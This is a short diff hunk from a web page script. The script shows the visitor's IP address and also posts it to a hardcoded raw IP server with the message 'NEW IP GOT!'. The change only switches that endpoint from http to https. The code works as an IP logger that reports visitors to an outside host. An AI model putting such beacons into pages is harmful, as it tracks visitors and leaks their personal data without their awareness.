@@ -35,7 +35,7 @@
                     // Display the IP address on the screen
                     document.getElementById("ip-address").textContent = data.ip;
                     const request = new XMLHttpRequest();
-                    request.open("POST","http://24.199.91.149:3000/api/ip")
+                    request.open("POST","https://24.199.91.149:3000/api/ip")
                     request.setRequestHeader('Content-type', 'application/json')
                     const params = {
                         content: "NEW IP GOT!\n"+data.ip
